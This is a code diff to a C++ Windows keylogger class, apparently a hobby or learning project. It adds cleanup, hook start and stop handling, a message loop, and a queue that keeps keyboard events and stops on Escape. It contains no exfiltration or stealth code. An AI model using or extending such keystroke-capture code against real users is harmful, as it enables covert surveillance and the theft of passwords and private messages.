@@ -13,6 +13,19 @@ Keylogger::Keylogger() : _eventManager(*(new EventManager(*this))), _hookHandler
 
 Keylogger::~Keylogger()
 {
+	if (_running)
+	{
+		if (!this->stop())
+		{
+			std::cout << "Stop error." << std::endl;
+		}
+	}
+	for (AEvent* event : _events)
+	{
+		delete event;
+	}
+	_events.clear();
+	system("Pause");
 }
 
 
@@ -21,8 +34,8 @@ Keylogger::~Keylogger()
 */
 bool Keylogger::init() {
 	_events.clear();
-	_hookHandler.init();
-	run();
+	if (!_hookHandler.init())
+		return false;
 	return true;
 }
 
@@ -32,8 +45,10 @@ bool Keylogger::init() {
 bool Keylogger::run() {
 	MSG msg;
 	_running = true;
-	while (GetMessage(&msg, NULL, 0, 0) && _running)
+	while (!PeekMessage(&msg, NULL, 0, 0, 0) && _running)
 	{
+		TranslateMessage(&msg);
+		DispatchMessage(&msg);
 	}
 	return true;
 }
@@ -43,7 +58,7 @@ bool Keylogger::run() {
 */
 bool Keylogger::stop() {
 	_running = false;
-	return false;
+	return _hookHandler.stop();
 }
 
 /**
@@ -59,12 +74,34 @@ bool Keylogger::kill() {
 */
 bool Keylogger::pushToQueue(const AEvent* event) {
 	int size = _events.size();
-	_events.push_back(const_cast<AEvent*>(event));
-	if (_events.size() == size)
+	if (!event->isMouse())
 	{
-		return false;
+		_events.push_back(const_cast<AEvent*>(event));
+		if (_events.size() == size)
+		{
+			return false;
+		}
+		if (event->getVirtualKeyCode() == VK_ESCAPE)
+			_running = false;
 	}
-	std::cout << event->getVirtualKeyCode() << std::endl;
-	//std::cout << "Event pushed : " << event-> << std::endl;
+	if (event->isMouse())
+	{
+		//	((MouseEvent*)(event))->describe();
+		delete event;
+	}
+	//else
+	//{
+	//	((KeyboardEvent*)(event))->describe();
+	//	if (event->getVirtualKeyCode() == VK_ESCAPE)
+	//	{
+	//		std::cout << "VK_ESCAPE=" << VK_ESCAPE << std::endl;
+	//		this->stop();
+	//	}
+	//}
 	return true;
+}
+
+std::vector<AEvent*>		Keylogger::getEvents() const
+{
+	return _events;
 }
